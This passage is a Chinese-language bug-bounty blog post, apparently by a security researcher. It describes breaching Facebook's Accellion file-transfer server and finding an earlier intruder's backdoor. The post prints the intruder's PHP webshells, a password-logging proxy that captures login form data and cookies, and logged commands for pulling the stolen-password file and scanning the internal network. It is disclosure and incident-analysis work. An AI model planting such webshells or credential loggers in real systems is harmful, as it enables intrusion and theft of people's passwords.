&lt;em&gt;↑ files.fb.com 登入介面&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從 LOGO 以及 Footer 判斷應該是 Accellion 的 Secure File Transfer (以下簡稱 FTA)&lt;/p&gt;

&lt;p&gt;FTA 為一款標榜安全檔案傳輸的產品，可讓使用者線上分享、同步檔案，並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制，Enterprise 版本更支援 SSL VPN 服務。&lt;/p&gt;

&lt;p&gt;首先看到 FTA 的第一件事是去網路上搜尋是否有公開的 Exploit 可以利用，Exploit 最近的是由 HD Moore 發現並發佈在 Rapid7 的這篇 Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;弱點中可直接從 “&lt;strong&gt;/tws/getStatus&lt;/strong&gt;” 中洩漏的版本資訊判斷是否可利用，在發現 files.fb.com 時版本已從有漏洞的 0.18 升級至 0.20 了，不過就從 Advisory 中所透露的片段程式碼感覺 FTA 的撰寫風格如果再繼續挖掘可能還是會有問題存在的，所以這時的策略便開始往尋找 FTA 產品的 0-Day 前進!&lt;/p&gt;

&lt;p&gt;不過從實際黑箱的方式其實找不出什麼問題點只好想辦法將方向轉為白箱測試，透過各種方式拿到舊版的 FTA 原始碼後終於可以開始研究了!&lt;/p&gt;

&lt;p&gt;整個 FTA 產品大致架構&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;網頁端介面主要由 Perl 以及 PHP 構成&lt;/li&gt;
  &lt;li&gt;PHP 原始碼皆經過 IonCube 加密&lt;/li&gt;
  &lt;li&gt;在背景跑了許多 Perl 的 Daemon&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;首先是解密 IonCude 的部分，許多設備為了防止自己的產品被檢視所以會將原始碼加密，不過好在 FTA 上的 IonCude 版本沒到最新，可以使用現成的工具解密，不過由於 PHP 版本的問題，細節部份以及數值運算等可能要靠自己修復一下，不然有點難看…&lt;/p&gt;

&lt;p&gt;經過簡單的原始碼審查後發現，好找的弱點應該都被 Rapid7 找走了 T^T&lt;br /&gt;
而需要認證才能觸發的漏洞又不怎麼好用，只好認真點往深層一點的地方挖掘!&lt;/p&gt;

&lt;p&gt;經過幾天的認真挖掘，最後總共發現了七個弱點，其中包含了&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;除了回報 Facebook 安全團隊外，其餘的弱點也製作成 Advisory 提交 Accellion 技術窗口，經過廠商修補提交 CERT/CC 後取得四個 CVE 編號&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;詳細的弱點細節會待 Full Disclosure Policy 後公布!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
&lt;em&gt;↑ 使用 Pre-Auth SQL Injection 寫入 Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;在實際滲透中進去伺服器後的第一件事情就是檢視當前的環境是否對自己友善，為了要讓自己可以在伺服器上待的久就要盡可能的了解伺服器上有何限制、紀錄，避開可能會被發現的風險 :P&lt;/p&gt;

&lt;p&gt;Facebook 大致有以下限制:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;防火牆無法連外, TCP, UDP, 53, 80, 443 皆無法&lt;/li&gt;
  &lt;li&gt;存在遠端的 Syslog 伺服器&lt;/li&gt;
  &lt;li&gt;開啟 Auditd 記錄&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;無法外連看起來有點麻煩，但是 ICMP Tunnel 看似是可行的，但這只是一個 Bug Bounty Program 其實不需要太麻煩就純粹以 Webshell 操作即可。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;似乎有點奇怪&quot;&gt;似乎有點奇怪?&lt;/h3&gt;

&lt;p&gt;正當收集證據準備回報 Facebook 安全團隊時，從網頁日誌中似乎看到一些奇怪的痕跡。&lt;/p&gt;

&lt;p&gt;首先是在 “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;” 中看到一些奇怪的 PHP 錯誤訊息，從錯誤訊息來看似乎像是邊改 Code 邊執行所產生的錯誤?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
&lt;em&gt;↑ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
跟隨錯誤訊息的路徑去看發現疑似前人留下的 Webshell 後門&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
&lt;em&gt;↑ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;其中幾個檔案的內容如下&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;沒錯，就是那個 &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f][&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;], basename(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES[&quot;f&quot;][&quot;name&quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/remote.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sclient_user_class_standard.inc.orig&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// 省略...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y-m-d H:i:s T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_USER_AGENT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;POST=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;GET=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;COOKIE=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// 省略...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;前幾個就是很標準的 PHP 一句話木馬&lt;br /&gt;
其中比較特別的是 “&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;” 這個檔案&lt;/p&gt;

&lt;p&gt;include_once 中 “&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;” 為原本對密碼進行驗證的 PHP 程式，駭客做了一個 Proxy 在中間並在進行一些重要操作時先把 GET, POST, COOKIE 的值記錄起來&lt;/p&gt;

&lt;p&gt;整理一下，駭客做了一個 Proxy 在密碼驗證的地方，並且記錄 Facebook 員工的帳號密碼，並且將記錄到的密碼放置在 Web 目錄下，駭客每隔一段時間使用   wget 抓取&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從紀錄裡面可以看到除了使用者帳號密碼外，還有從 FTA 要求檔案時的信件內容，記錄到的帳號密碼會定時 Rotate (後文會提及，這點還滿機車的XD)&lt;/p&gt;

&lt;p&gt;發現當下，最近一次的 Rotate 從 2/1 記錄到 2/7 共約 300 筆帳號密碼紀錄，大多都是 “&lt;strong&gt;@fb.com&lt;/strong&gt;” 或是 “&lt;strong&gt;@facebook.com&lt;/strong&gt;” 的員工帳密，看到當下覺得事情有點嚴重了，在 FTA 中，使用者的登入主要有兩種模式&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;一般用戶註冊，密碼 Hash 存在資料庫，由 SHA256 + SALT 儲存&lt;/li&gt;
  &lt;li&gt;Facebook 員工 (@fb.com) 則走統一認證，使用 LDAP 由 AD 認證&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在這裡相信記錄到的是真實的員工帳號密碼，&lt;strong&gt;**猜測&lt;/strong&gt;** 這份帳號密碼應該可以通行 Facebook Mail OWA, VPN 等服務做更進一步的滲透…&lt;/p&gt;

&lt;p&gt;此外，這名 “駭客” 可能習慣不太好 :P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;後門參數皆使用 GET 來傳遞，在網頁日誌可以很明顯的發現他的足跡&lt;/li&gt;
  &lt;li&gt;駭客在進行一些指令操作時沒顧慮到 STDERR ，導致網頁日誌中很多指令的錯誤訊息，從中可以觀察駭客做了哪些操作&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;
從 access.log 可以觀察到的每隔數日駭客會將記錄到的帳號密碼清空&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&apos; 2&amp;gt;/dev/stdout HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;打包檔案&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp_list3_2 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;2&amp;gt;/dev/stdout
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czvf&lt;/span&gt; files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;對內部網路結構進行探測&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;p&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;for i in &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &quot;192.168.&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&quot;; done; done&apos; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;使用 Shell Script 進行內網掃描但忘記把 STDERR 導掉XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;嘗試對內部 LDAP 進行連接&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&apos;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &apos;********&apos; -s base (objectclass=*) 2&amp;gt;/dev/stdout&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;嘗試訪問內部網路資源&lt;br /&gt;
( 看起來 Mail OWA 可以直接訪問 …)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&apos;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&apos; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;嘗試對 SSL Private Key 下手&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從瀏覽器觀察 files.fb.com 的憑證還是 Wildcard 的 *.fb.com …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;後記&quot;&gt;後記&lt;/h3&gt;

&lt;p&gt;在收集完足夠證據後便立即回報給 Facebook 安全團隊，回報內容除了漏洞細節外，還附上相對應的 Log 、截圖以及時間紀錄xD&lt;/p&gt;

&lt;p&gt;從伺服器中的日誌可以發現有兩個時間點是明顯駭客在操作系統的時間，一個是七月初、另個是九月中旬&lt;/p&gt;

&lt;p&gt;七月初的動作從紀錄中來看起來比較偏向 “逛” 伺服器，但九月中旬的操作就比較惡意了，除了逛街外，還放置了密碼 Logger 等，至於兩個時間點的 “駭客” 是不是同一個人就不得而知了 :P&lt;br /&gt;
而七月發生的時機點正好接近 CVE-2015-2857 Exploit 公佈前，究竟是透過 1-Day 還是無 0-Day 入侵系統也無從得知了。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;這件事情就記錄到這裡，總體來說這是一個非常有趣的經歷xD&lt;br /&gt;
也讓我有這個機會可以來寫寫關於滲透的一些文章 :P&lt;/p&gt;

&lt;p&gt;最後也感謝 Bug Bounty 及胸襟寬闊的 Facebook 安全團隊 讓我可以完整記錄這起事件 : )&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 提供漏洞詳情給 Facebook 安全團隊&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 收到機器人自動回覆&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 提供弱點 Advisory 給 Accellion 技術窗口&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 收到 Thomas 的回覆，告知調查中&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 收到 Reginaldo 的回覆，告知 Bug Bounty 獎金 $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 詢問是否撰寫 Blog 是否有任何要注意的地方?&lt;/li&gt;
  &lt;li&gt;2016/02/13 詢問此漏洞被認為是 RCE 還是 SQL Injection&lt;/li&gt;
  &lt;li&gt;2016/02/18 收到 Reginaldo 的回覆，告知正在進行調查中，希望 Blog 先暫時不要發出&lt;/li&gt;
  &lt;li&gt;2016/02/24 收到 Hai 的回覆，告知獎金將會於三月發送&lt;/li&gt;
  &lt;li&gt;2016/04/20 收到 Reginaldo 的回覆，告知調查已完成&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

